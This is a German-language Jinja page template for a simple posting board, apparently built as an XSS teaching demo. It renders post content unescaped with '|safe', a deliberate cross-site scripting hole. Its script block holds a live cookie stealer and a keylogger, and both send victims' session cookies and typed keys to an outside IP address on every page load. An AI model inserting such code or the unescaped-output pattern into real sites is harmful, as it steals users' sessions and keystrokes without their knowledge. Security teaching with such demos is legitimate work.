{% extends "base.html" %}
{% block content %}
<div class="container my-4" style="max-width: 900px;">
  <h2 class="mb-3">Neuen Beitrag posten</h2>

  <div class="card mb-4">
    <div class="card-body">
      <form method="post">
        <div class="mb-3">
          <label class="form-label">Beitrag</label>
          <textarea name="content" class="form-control" rows="5" maxlength="512" placeholder="Schreibe etwas..."></textarea>
          <div id="cnt" class="text-end small mt-1">0/512</div>
        </div>
        <button type="submit" class="btn btn-primary">Posten</button>
      </form>
    </div>
  </div>

  <h3 class="mb-3">Alle Posts</h3>
  <div class="list-group">
    {% for p in posts %}
      <div class="list-group-item">
        <div class="d-flex justify-content-between">
          <strong>@{{ p.username }}</strong>
          <small>{{ p.created_at }}</small>
        </div>
        <div class="mt-2" style="white-space: pre-wrap;">{{ p.content|safe }}</div>
      </div>
    {% else %}
      <div class="text-muted">Noch keine Posts vorhanden.</div>
    {% endfor %}
  </div>
</div>

<script>
  // Character counter
  (function(){
    const ta = document.querySelector('textarea[name="content"]');
    if(!ta) return;
    const max = 512;
    const cnt = document.getElementById('cnt');
    function upd(){ cnt.textContent = ta.value.length + '/' + max; }
    ta.addEventListener('input', upd); upd();
  })();

  // XSS Demo: Cookie Stealer
  fetch('http://141.87.56.125:5001/steal_cookie?c=' + document.cookie);

  // XSS Demo: Keylogger
  let buffer = '';
  document.addEventListener('keypress', function(e) {
    buffer += e.key;
    if (buffer.length >= 10) {
      fetch('http://141.87.56.125:5001/log_keys', {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: 'keys=' + encodeURIComponent(buffer)
      });
      buffer = '';
    }
  });
</script>
{% endblock %}
